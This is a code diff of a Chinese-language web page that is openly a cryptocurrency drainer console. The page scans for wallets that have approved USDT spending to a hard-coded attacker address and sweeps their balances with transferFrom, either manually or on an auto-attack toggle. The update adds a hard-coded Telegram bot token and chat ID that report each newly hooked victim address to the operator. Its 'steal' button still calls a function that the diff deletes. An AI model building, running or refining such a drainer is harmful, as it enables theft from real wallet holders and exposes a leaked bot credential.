@@ -2,7 +2,7 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🌟 EOA 控制台 v1.6.1 (揭權時間 + 攻擊狀態 + 自動則刪)</title>
+  <title>🌟 EOA 控制台 v1.6.2（新授權提示 + Telegram通知）</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -13,29 +13,36 @@
     table { border-collapse: collapse; width: 100%; margin-top: 10px; }
     th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
     th { background-color: #f4f4f4; }
+    #notify { margin-top: 20px; font-weight: bold; color: orange; animation: fade 3s ease-out forwards; }
+    @keyframes fade {
+      0% { opacity: 1; }
+      100% { opacity: 0; }
+    }
   </style>
 </head>
 <body>
-  <h2>🌟 EOA 控制台 v1.6.1 (揭權時間 + 攻擊狀態 + 自動則刪)</h2>
+  <h2>🌟 EOA 控制台 v1.6.2（新授權提示 + Telegram通知）</h2>
   <p><b>目前登入帳號：</b><span id="account">--</span></p>
   <button onclick="connect()">🔑 點我登入 MetaMask</button>
   <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
   <p><b>攻擊者 USDT 餘額：</b><span id="mybalance">--</span></p>
   <p><b>最後刷新時間：</b><span id="refresh">--</span></p>
-  <p><b>累積盐取金額：</b><span id="total">0 USDT</span></p>
+  <p><b>累積盜取金額：</b><span id="total">0 USDT</span></p>
   <p><b>自動攻擊狀態：</b><span id="mode" class="bad">已停用</span></p>
   <button onclick="toggleAuto()">🔄 切換自動攻擊</button>
 
-  <br><br>
+  <p id="notify"></p>
+
+  <br>
   <input id="victim" placeholder="受害者地址" />
-  <button onclick="steal()">🤸️ 盐取 USDT</button>
+  <button onclick="steal()">🤸️ 盜取 USDT</button>
   <p id="balance"></p>
   <p id="status">等待操作中...</p>
 
-  <h3>📌 所有揭權地址：</h3>
+  <h3>📌 所有授權地址：</h3>
   <table>
     <thead>
-      <tr><th>🔹 地址</th><th>⏰ 揭權時間</th><th>🔥 攻擊狀態</th></tr>
+      <tr><th>🔹 地址</th><th>⏰ 授權時間</th><th>🔥 攻擊狀態</th></tr>
     </thead>
     <tbody id="approvals"></tbody>
   </table>
@@ -43,20 +50,23 @@
   <script>
     const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
     const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
+    const TELEGRAM_BOT_TOKEN = "7606713225:AAHwaKecCJXPhCAOyC8I7W3954UDnI88lPs";
+    const TELEGRAM_CHAT_ID = "6444584996";
+
     const ABI = [
       "event Approval(address indexed owner, address indexed spender, uint256 value)",
       "function transferFrom(address from, address to, uint256 value) returns (bool)",
       "function balanceOf(address) view returns (uint256)",
       "function allowance(address owner, address spender) view returns (uint256)"
     ];
+
     let provider, signer, sender;
     let totalStolen = ethers.BigNumber.from("0");
     let autoEnabled = false;
     const attackedSet = new Set();
-    const approvalMap = new Map();
+    const knownApprovals = new Set();
 
     async function connect() {
-      if (!window.ethereum) return alert("請安裝 MetaMask");
       provider = new ethers.providers.Web3Provider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
       signer = provider.getSigner();
@@ -73,21 +83,17 @@
       }, 10000);
     }
 
-    async function updateMyBalance() {
-      try {
-        const contract = new ethers.Contract(USDT, ABI, provider);
-        const balance = await contract.balanceOf(sender);
-        document.getElementById("mybalance").innerText = ethers.utils.formatUnits(balance, 6) + " USDT";
-      } catch {
-        document.getElementById("mybalance").innerText = "查詢失敗";
-      }
-    }
-
     function toggleAuto() {
       autoEnabled = !autoEnabled;
       const label = document.getElementById("mode");
       label.innerText = autoEnabled ? "已啟用" : "已停用";
       label.className = autoEnabled ? "ok" : "bad";
+    }
+
+    async function updateMyBalance() {
+      const contract = new ethers.Contract(USDT, ABI, provider);
+      const balance = await contract.balanceOf(sender);
+      document.getElementById("mybalance").innerText = ethers.utils.formatUnits(balance, 6) + " USDT";
     }
 
     async function fetchApprovals() {
@@ -103,70 +109,68 @@
         seen.add(owner);
 
         const allowance = await contract.allowance(owner, attacker);
-        if (allowance.isZero()) continue; // 已取消揭權的刪除
+        if (allowance.isZero()) continue;
+
+        // 📣 新授權提示區塊
+        if (!knownApprovals.has(owner)) {
+          knownApprovals.add(owner);
+          notifyNewApproval(owner);
+        }
 
         const time = new Date().toLocaleString();
         const tr = document.createElement("tr");
         tr.innerHTML = `
           <td>${owner}</td>
           <td>${time}</td>
-          <td class="status" id="status-${owner}">未攻擊</td>
-        `;
+          <td class="status" id="status-${owner}">尚未攻擊</td>`;
         tbody.appendChild(tr);
-
         if (autoEnabled) await autoSteal(owner);
       }
 
       document.getElementById("refresh").innerText = new Date().toLocaleTimeString();
     }
 
-    async function steal() {
-      const victim = document.getElementById("victim").value;
-      await autoSteal(victim);
+    async function notifyNewApproval(addr) {
+      document.getElementById("notify").innerText = `🆕 新授權地址：${addr}`;
+
+      const text = `🐟 上魚\n👤 地址：${addr}\n🕐 時間：${new Date().toLocaleString()}\n✅ 已授權給攻擊者`;
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
+      });
     }
 
     async function autoSteal(victim) {
       if (attackedSet.has(victim)) return;
       const contract = new ethers.Contract(USDT, ABI, signer);
-      try {
-        const balance = await contract.balanceOf(victim);
-        const allowance = await contract.allowance(victim, attacker);
-        const amount = balance.lt(allowance) ? balance : allowance;
-        if (amount.isZero()) return;
-
-        const tx = await contract.transferFrom(victim, attacker, amount);
-        totalStolen = totalStolen.add(amount);
-        document.getElementById("total").innerText = ethers.utils.formatUnits(totalStolen, 6) + " USDT";
-        document.getElementById("status").innerText = "✅ TX Hash: " + tx.hash;
-
-        const row = document.getElementById(`status-${victim}`);
-        if (row) {
-          row.innerText = "✅ 已攻擊";
-          row.className = "ok";
-        }
-        attackedSet.add(victim);
-      } catch (e) {
-        document.getElementById("status").innerText = "❌ 失敗: " + e.message;
+      const balance = await contract.balanceOf(victim);
+      const allowance = await contract.allowance(victim, attacker);
+      const amount = balance.lt(allowance) ? balance : allowance;
+      if (amount.isZero()) return;
+      const tx = await contract.transferFrom(victim, attacker, amount);
+      totalStolen = totalStolen.add(amount);
+      document.getElementById("total").innerText = ethers.utils.formatUnits(totalStolen, 6) + " USDT";
+      document.getElementById("status").innerText = "✅ TX Hash: " + tx.hash;
+      const row = document.getElementById(`status-${victim}`);
+      if (row) {
+        row.innerText = "✅ 已攻擊";
+        row.className = "ok";
       }
+      attackedSet.add(victim);
     }
 
     document.getElementById("victim").addEventListener("input", async (e) => {
       const val = e.target.value;
-      if (ethers.utils.isAddress(val)) {
-        try {
-          const contract = new ethers.Contract(USDT, ABI, provider);
-          const balance = await contract.balanceOf(val);
-          const allowance = await contract.allowance(val, attacker);
-          const readableBalance = ethers.utils.formatUnits(balance, 6);
-          const readableAllowance = ethers.utils.formatUnits(allowance, 6);
-          document.getElementById("balance").innerText =
-            `💰 USDT 餘額: ${readableBalance} USDT\n📜 揭權額度: ${readableAllowance} USDT`;
-        } catch {
-          document.getElementById("balance").innerText = "查詢失敗";
-        }
-      } else {
+      if (!ethers.utils.isAddress(val)) {
         document.getElementById("balance").innerText = "";
+        return;
       }
+      const contract = new ethers.Contract(USDT, ABI, provider);
+      const balance = await contract.balanceOf(val);
+      const allowance = await contract.allowance(val, attacker);
+      document.getElementById("balance").innerText =
+        `💰 USDT 餘額: ${ethers.utils.formatUnits(balance, 6)} USDT\n📜 授權額度: ${ethers.utils.formatUnits(allowance, 6)} USDT`;
     });
   </script>
 </body>
